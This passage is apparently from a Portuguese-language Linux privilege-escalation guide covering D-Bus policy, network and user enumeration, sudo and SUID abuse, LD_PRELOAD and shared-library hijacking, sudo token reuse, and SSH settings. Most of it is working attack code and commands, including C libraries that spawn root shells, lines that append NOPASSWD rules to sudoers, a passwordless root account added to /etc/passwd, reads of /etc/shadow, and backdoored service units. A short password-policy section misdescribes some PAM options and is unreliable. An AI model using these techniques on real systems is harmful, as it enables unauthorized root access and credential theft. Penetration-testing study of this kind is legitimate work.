Como um sistema de objeto e IPC completo, o D-BUS tem vários usos pretendidos. Primeiro, o D-BUS pode realizar IPC básico do aplicativo, permitindo que um processo transporte dados para outro - pense em **sockets de domínio UNIX em esteroides**. Em segundo lugar, o D-BUS pode facilitar o envio de eventos ou sinais pelo sistema, permitindo que diferentes componentes no sistema se comuniquem e, em última análise, se integrem melhor. Por exemplo, um daemon Bluetooth pode enviar um sinal de chamada recebida que seu player de música pode interceptar, diminuindo o volume até que a chamada termine. Finalmente, o D-BUS implementa um sistema de objeto remoto, permitindo que um aplicativo solicite serviços e invoque métodos de um objeto diferente - pense em CORBA sem as complicações. (De [aqui](https://www.linuxjournal.com/article/7744)).

O D-Bus usa um **modelo de permitir/negar**, onde cada mensagem (chamada de método, emissão de sinal, etc.) pode ser **permitida ou negada** de acordo com a soma de todas as regras de política que a correspondem. Cada regra na política deve ter o atributo `own`, `send_destination` ou `receive_sender` definido.

Parte da política de `/etc/dbus-1/system.d/wpa_supplicant.conf`:
```markup
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
Portanto, se uma política permitir que seu usuário interaja com o barramento de alguma forma, você pode ser capaz de explorá-la para elevar privilégios (talvez apenas ouvindo algumas senhas?).

Observe que uma política que não especifica nenhum usuário ou grupo afeta todos (`<policy>`).\
Políticas para o contexto "padrão" afetam todos que não são afetados por outras políticas (`<policy context="default"`).

**Aprenda como enumerar e explorar uma comunicação D-Bus aqui:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Rede**

É sempre interessante enumerar a rede e descobrir a posição da máquina.

### Enumeração genérica
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com a qual você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique se você pode capturar tráfego. Se puder, poderá obter algumas credenciais.
```
timeout 1 tcpdump
```
## Usuários

### Enumeração Genérica

Verifique **quem** você é, quais **privilégios** você tem, quais **usuários** estão no sistema, quais podem **fazer login** e quais têm **privilégios de root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Grande

Algumas versões do Linux foram afetadas por um bug que permite que usuários com **UID > INT\_MAX** aumentem seus privilégios. Mais informações: [aqui](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [aqui](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [aqui](https://twitter.com/paragonsec/status/1071152249529884674).\
**Explorá-lo** usando: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que possa conceder privilégios de root:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```
### Política de Senhas

#### Verificando a Política de Senhas

Para verificar a política de senhas atual, podemos usar o comando `cracklib-check`. Este comando nos mostrará a política atual e nos permitirá verificar a força de uma senha.

#### Forçando a Política de Senhas

Para forçar a política de senhas, podemos editar o arquivo `/etc/pam.d/common-password`. Este arquivo contém as configurações de senha para o sistema. Podemos adicionar ou modificar as seguintes linhas para forçar a política de senhas:

```
password    requisite           pam_cracklib.so retry=3 minlen=8 difok=3 ucredit=-1 lcredit=-2 dcredit=-1 ocredit=-1
password    [success=1 default=ignore]  pam_unix.so obscure sha512
```

Essas linhas forçarão as seguintes políticas de senha:

- A senha deve ter pelo menos 8 caracteres (`minlen=8`).
- A senha deve conter pelo menos 1 letra maiúscula (`ucredit=-1`).
- A senha deve conter pelo menos 2 letras minúsculas (`lcredit=-2`).
- A senha deve conter pelo menos 1 número (`dcredit=-1`).
- A senha deve conter pelo menos 1 caractere especial (`ocredit=-1`).
- A senha não pode conter mais de 3 caracteres consecutivos iguais (`difok=3`).
- A senha não pode ser uma senha comum (`pam_unix.so obscure sha512`).

#### Evitando Senhas Vazadas

Para evitar senhas vazadas, podemos usar o serviço `haveibeenpwned.com` para verificar se uma senha foi comprometida em um vazamento de dados. Podemos usar o seguinte comando para verificar uma senha:

```
$ curl -s https://api.pwnedpasswords.com/range/$(echo -n "password" | sha1sum | cut -c 1-5) | grep $(echo -n "password" | sha1sum | cut -c 6-40 | tr '[:lower:]' '[:upper:]')
```

Se a senha foi comprometida, o comando retornará o número de vezes que a senha apareceu em vazamentos de dados. Se a senha não foi comprometida, o comando não retornará nada.
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **conhece alguma senha** do ambiente, tente fazer login como cada usuário usando a senha.

### Su Brute

Se não se importa em fazer muito barulho e os binários `su` e `timeout` estão presentes no computador, você pode tentar forçar a entrada de usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta forçar a entrada de usuários.

## Abusos de PATH graváveis

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH**, pode ser capaz de escalar privilégios criando uma porta dos fundos dentro da pasta gravável com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não é carregado de uma pasta que está localizada anteriormente** à sua pasta gravável em $PATH.

### SUDO e SUID

Você pode ter permissão para executar algum comando usando sudo ou eles podem ter o bit suid. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem ler e/ou escrever arquivos ou até mesmo executar um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem saber a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```
Neste exemplo, o usuário `demo` pode executar o `vim` como `root`, agora é trivial obter um shell adicionando uma chave ssh no diretório root ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite ao usuário **definir uma variável de ambiente** enquanto executa algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, baseado na máquina HTB Admirer, estava vulnerável a um **sequestro de PYTHONPATH** para carregar uma biblioteca python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Bypassando execução do Sudo por caminhos

**Pule** para ler outros arquivos ou use **links simbólicos**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **coringa** é usado (\*), é ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/Binário SUID sem caminho de comando

Se a **permissão sudo** for dada a um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_, você pode explorá-lo alterando a variável PATH.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica também pode ser usada se um binário **suid** executa outro comando sem especificar o caminho para ele (sempre verifique com o comando **_strings_** o conteúdo de um binário SUID suspeito).

[Exemplos de payload para executar.](payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** executa outro comando especificando o caminho, então você pode tentar **exportar uma função** com o mesmo nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_, você deve tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chama o binário suid, essa função será executada.

### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

**LD\_PRELOAD** é uma variável ambiental opcional que contém um ou mais caminhos para bibliotecas compartilhadas, ou objetos compartilhados, que o carregador carregará antes de qualquer outra biblioteca compartilhada, incluindo a biblioteca de tempo de execução C (libc.so). Isso é chamado de pré-carregamento de uma biblioteca.

Para evitar que esse mecanismo seja usado como um vetor de ataque para binários executáveis _suid/sgid_, o carregador ignora _LD\_PRELOAD_ se _ruid != euid_. Para esses binários, apenas bibliotecas em caminhos padrão que também são _suid/sgid_ serão pré-carregadas.

Se você encontrar dentro da saída de **`sudo -l`** a frase: _**env\_keep+=LD\_PRELOAD**_ e puder chamar algum comando com sudo, poderá escalar privilégios.
```
Defaults        env_keep += LD_PRELOAD
```
Salve como **/tmp/pe.c**.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
Em seguida, **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **eleve privilégios** executando
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Uma privesc semelhante pode ser explorada se o atacante controlar a variável de ambiente **LD\_LIBRARY\_PATH**, pois ele controla o caminho onde as bibliotecas serão procuradas.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binário SUID - Injeção de .so

Se você encontrar algum binário estranho com permissões **SUID**, você pode verificar se todos os arquivos **.so** estão **carregados corretamente**. Para fazer isso, você pode executar:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, se você encontrar algo como: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ você pode explorá-lo.

Crie o arquivo _/home/user/.config/libcalc.c_ com o código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Compile-o usando:
```bash
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
## Sequestro de Objeto Compartilhado
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um binário SUID carregando uma biblioteca de uma pasta onde podemos escrever, vamos criar a biblioteca nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
Se você receber um erro como este:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista selecionada de binários Unix que podem ser explorados por um invasor para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos em que você só pode injetar argumentos em um comando.

O projeto coleta funções legítimas de binários Unix que podem ser abusadas para quebrar shells restritos, escalar ou manter privilégios elevados, transferir arquivos, gerar shells de bind e reversos e facilitar outras tarefas de pós-exploração.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Se você pode acessar `sudo -l`, pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra como explorar alguma regra do sudo.

### Reutilizando Tokens do Sudo

No cenário em que **você tem um shell como usuário com privilégios de sudo** mas não sabe a senha do usuário, você pode **esperar que ele/ela execute algum comando usando `sudo`**. Então, você pode **acessar o token da sessão em que o sudo foi usado e usá-lo para executar qualquer coisa como sudo** (escalada de privilégios).

Requisitos para escalar privilégios:

* Você já tem um shell como usuário "_sampleuser_"
* "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do token sudo que nos permite usar `sudo` sem introduzir nenhuma senha)
* `cat /proc/sys/kernel/yama/ptrace_scope` é 0
* `gdb` é acessível (você pode ser capaz de carregá-lo)

(Você pode temporariamente habilitar `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou modificar permanentemente `/etc/sysctl.d/10-ptrace.conf` e definir `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o token sudo em sua sessão** (você não receberá automaticamente um shell root, faça `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **propriedade do root com setuid**.
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* O **terceiro exploit** (`exploit_v3.sh`) irá **criar um arquivo sudoers** que torna **os tokens sudo eternos e permite que todos os usuários usem o sudo**.
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Nome de Usuário>

Se você tiver **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro da pasta, poderá usar o binário [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) para **criar um token sudo para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver um shell como esse usuário com PID 1234, poderá **obter privilégios sudo** sem precisar saber a senha fazendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar o `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você pode **ler** este arquivo, pode ser capaz de **obter algumas informações interessantes**, e se você pode **escrever** em qualquer arquivo, será capaz de **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você pode escrever, você pode abusar dessa permissão.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra forma de abusar dessas permissões:
```bash
# makes it so every terminal can sudo  
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas ao binário `sudo`, como o `doas` para OpenBSD, lembre-se de verificar sua configuração em `/etc/doas.conf`.
```
permit nopass demo as root cmd vim
```
### Sequestro de Sudo

Se você sabe que um **usuário geralmente se conecta a uma máquina e usa o `sudo`** para elevar privilégios e você obteve um shell dentro do contexto desse usuário, você pode **criar um novo executável do sudo** que executará seu código como root e, em seguida, o comando do usuário. Em seguida, **modifique o $PATH** do contexto do usuário (por exemplo, adicionando o novo caminho em .bash\_profile) para que, quando o usuário executar o sudo, seu executável do sudo seja executado.

Observe que, se o usuário usar um shell diferente (não bash), você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo, o [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Tipicamente, este arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração de `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde as **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema procurará bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de gravação** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta dentro do arquivo de configuração dentro de `/etc/ld.so.conf.d/*.conf`, ele poderá elevar privilégios.\
Dê uma olhada em **como explorar essa má configuração** na seguinte página:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a biblioteca para `/var/tmp/flag15/`, ela será usada pelo programa neste local, conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```
Crie uma biblioteca maliciosa em `/var/tmp` com o comando `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`.
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```
## Capacidades

As capacidades do Linux fornecem **um subconjunto dos privilégios de root disponíveis para um processo**. Isso efetivamente divide os **privilégios de root em unidades menores e distintas**. Cada uma dessas unidades pode ser concedida independentemente a processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a seguinte página para **saber mais sobre as capacidades e como abusar delas**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Permissões de diretório

Em um diretório, o **bit "execute"** implica que o usuário afetado pode "**cd**" no diretório.\
O bit **"read"** implica que o usuário pode **listar** os **arquivos**, e o bit **"write"** implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

As ACLs (Listas de Controle de Acesso) são o segundo nível de permissões discricionárias, que **podem substituir as permissões padrão ugo/rwx**. Quando usadas corretamente, elas podem conceder uma **melhor granularidade na definição do acesso a um arquivo ou diretório**, por exemplo, dando ou negando acesso a um usuário específico que não é o proprietário do arquivo nem o proprietário do grupo (de [**aqui**](https://linuxconfig.org/how-to-manage-acls-on-linux)).\
**Dê** ao usuário "kali" permissões de leitura e escrita sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obter** arquivos com ACLs específicas do sistema:

Para encontrar arquivos com ACLs específicas, podemos usar o comando `getfacl` para listar as ACLs de todos os arquivos e, em seguida, filtrar os resultados com o comando `grep`. Por exemplo, para encontrar todos os arquivos com a ACL `user::rwx`, podemos executar o seguinte comando:

```
getfacl -R / 2>/dev/null | grep 'user::rwx'
```

Onde `-R` indica que o comando deve ser executado recursivamente em todo o sistema de arquivos, `2>/dev/null` redireciona quaisquer erros para o `null` para que não sejam exibidos na saída e `grep 'user::rwx'` filtra os resultados para mostrar apenas os arquivos com a ACL `user::rwx`.
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Sessões de shell abertas

Em **versões antigas**, você pode **sequestrar** algumas sessões de **shell** de um usuário diferente (**root**).\
Nas **versões mais recentes**, você só poderá se **conectar** às sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### Sequestro de sessões de tela

**Listar sessões de tela**
```bash
screen -ls
```
**Anexar a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
```
## Sequestro de sessões do tmux

Este era um problema com **versões antigas do tmux**. Não consegui sequestrar uma sessão do tmux (v2.1) criada pelo root como um usuário não privilegiado.

**Listar sessões do tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Verifique **Valentine box do HTB** para um exemplo.

## SSH

### Debian OpenSSL PRNG previsível - CVE-2008-0166

Todas as chaves SSL e SSH geradas em sistemas baseados em Debian (Ubuntu, Kubuntu, etc) entre setembro de 2006 e 13 de maio de 2008 podem ser afetadas por esse bug.\
Esse bug é causado ao criar uma nova chave ssh nesses sistemas operacionais, pois **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e **tendo a chave pública ssh, você pode procurar pela chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuração interessantes do SSH

* **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão é `no`.
* **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
* **PermitEmptyPasswords**: Quando a autenticação por senha é permitida, especifica se o servidor permite o login em contas com strings de senha vazias. O padrão é `no`.

### PermitRootLogin

Especifica se o root pode fazer login usando ssh, o padrão é `no`. Possíveis valores:

* `yes`: root pode fazer login usando senha e chave privada
* `without-password` ou `prohibit-password`: root só pode fazer login com uma chave privada
* `forced-commands-only`: Root só pode fazer login usando chave privada e se as opções de comandos forem especificadas
* `no` : não

### AuthorizedKeysFile

Especifica arquivos que contêm as chaves públicas que podem ser usadas para autenticação do usuário. Ele pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do diretório home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Aquela configuração indicará que se você tentar fazer login com a chave **privada** do usuário "**testusername**", o ssh irá comparar a chave pública da sua chave com as localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`.

### ForwardAgent/AllowAgentForwarding

O encaminhamento do agente SSH permite que você **use suas chaves SSH locais em vez de deixar as chaves** (sem frases secretas!) **sentadas em seu servidor**. Assim, você poderá **pular** via ssh **para um host** e a partir daí **pular para outro** host **usando** a **chave** localizada em seu **host inicial**.

Você precisa definir essa opção em `$HOME/.ssh.config` assim:
```
Host example.com
  ForwardAgent yes
```
Observe que se `Host` for `*`, toda vez que o usuário pular para uma máquina diferente, essa máquina poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **substituir** essas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você encaminhar o agente configurado em um ambiente \[**verifique aqui como explorá-lo para escalar privilégios**]\(ssh-forward-agent-exploitation.md).

## Arquivos interessantes

### Arquivos de perfil

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de perfil estranho for encontrado, você deve verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto, é recomendável **encontrar todos eles** e **verificar se você pode lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, é possível encontrar **hashes de senha** dentro do arquivo `/etc/passwd` (ou equivalente).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Em seguida, adicione o usuário `hacker` e adicione a senha gerada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Por exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as seguintes linhas para adicionar um usuário fictício sem senha.\
ATENÇÃO: você pode degradar a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Nas plataformas BSD, o arquivo `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, além disso, o arquivo `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se pode **escrever em alguns arquivos sensíveis**. Por exemplo, você pode escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/**, então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Seu backdoor será executado na próxima vez que o tomcat for iniciado.

### Verificar Pastas

As seguintes pastas podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente).
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Arquivos em localizações estranhas/propriedade de outros usuários

#### Descrição

